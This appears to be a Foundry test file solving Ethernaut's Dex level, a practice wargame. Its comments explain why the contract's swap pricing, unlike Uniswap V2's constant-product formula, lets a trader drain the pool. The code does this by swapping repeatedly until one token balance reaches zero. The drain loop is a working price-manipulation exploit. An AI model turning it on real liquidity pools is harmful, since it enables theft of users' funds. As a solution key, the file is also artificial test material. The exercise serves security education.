// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Dex} from "../../src/22/Dex.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {DexFactory} from "src/22/DexFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract DexTest is Test, BaseTest {
    Dex public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new DexFactory());
        vm.deal(player, 1 ether);
    }

    function setUp() public override {
        super.setUp();
        config = new HelperConfig{value: 1 ether}(levelFactory);
        (ethernaut, instance,) = config.activeNetworkConfig();

        instanceContract = Dex(instance);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        // The most important thing to notice here is that when you swap an amount of tokens for the other, the amount of the other token that can be taken out DO NOT decrease proportionally
        // Example: For uniswap V2 the constant product formula is x * y = k
        // You thus have x * y = (x + ∆x) * (y − ∆y)
        // If you decide to swap an amount ∆x for ∆y : ∆y = ∆x * y / (x + ∆x) which maintains the invariant 
        // While for Dex contract you would have : ∆y = ∆x * y / x. Since this formula does not account for the changes in token quantities after each swap, you would have x * y < k after the swap. After each swap, the user receives more tokens than intended. 
        // Moroever the Dex formula does not adjust the price impact. For uniswap V2 after each trade, the token ratios make subsequent trades less favorable for a trader.

        // Because the formula does not adjust the exchange rate based on the remaining pool balances, an attacker could repeatedly perform swaps to drain one token type from the pool without increasing the cost of subsequent swaps. While for uniswap, each swap should progressively worsen the rate due to the invariant maintenance.

        // Invariant aside, there is also another issue related to rounding error. Imagine you are swapping X amount of token1 but that the balance(token2) * X < balance(token1), then you will get 0 tokens. This is another issue that is not discussed here.

        // We will create a small script that continues swapping the max amount of user tokens until one of the two balances are 0. Some checks are put in place in case the balance of the Dex gets too low. In this case we will swap using the Dex's whole balance instead.

        instanceContract.approve(address(instanceContract), type(uint256).max);
        uint256 balanceDexToken1;
        uint256 balanceDexToken2;

        while (
            instanceContract.balanceOf(instanceContract.token1(), address(instanceContract)) > 0
                && instanceContract.balanceOf(instanceContract.token2(), address(instanceContract)) > 0
        ) {
            balanceDexToken1 = instanceContract.balanceOf(instanceContract.token1(), address(instanceContract));
            balanceDexToken2 = instanceContract.balanceOf(instanceContract.token2(), address(instanceContract));
            uint256 maxToken1BalanceUser = instanceContract.balanceOf(instanceContract.token1(), player);
            uint256 maxToken2BalanceDex = ((maxToken1BalanceUser * balanceDexToken2) / balanceDexToken1);

            if (balanceDexToken2 > maxToken2BalanceDex) {
                instanceContract.swap(
                    instanceContract.token1(),
                    instanceContract.token2(),
                    instanceContract.balanceOf(instanceContract.token1(), player)
                );
            } else {
                instanceContract.swap(instanceContract.token1(), instanceContract.token2(), balanceDexToken1);
            }
            balanceDexToken1 = instanceContract.balanceOf(instanceContract.token1(), address(instanceContract));
            balanceDexToken2 = instanceContract.balanceOf(instanceContract.token2(), address(instanceContract));
            uint256 maxToken2BalanceUser = instanceContract.balanceOf(instanceContract.token2(), player);
            uint256 maxToken1BalanceDex = ((maxToken2BalanceUser * balanceDexToken1) / balanceDexToken2);

            if (balanceDexToken1 > maxToken1BalanceDex) {
                instanceContract.swap(
                    instanceContract.token2(),
                    instanceContract.token1(),
                    instanceContract.balanceOf(instanceContract.token2(), player)
                );
            } else {
                instanceContract.swap(instanceContract.token2(), instanceContract.token1(), balanceDexToken2);
            }
        }

        vm.stopPrank();

        balanceDexToken1 = instanceContract.balanceOf(instanceContract.token1(), address(instanceContract));
        balanceDexToken2 = instanceContract.balanceOf(instanceContract.token2(), address(instanceContract));

        assert(balanceDexToken1 == 0 || balanceDexToken2 == 0);
    }
}
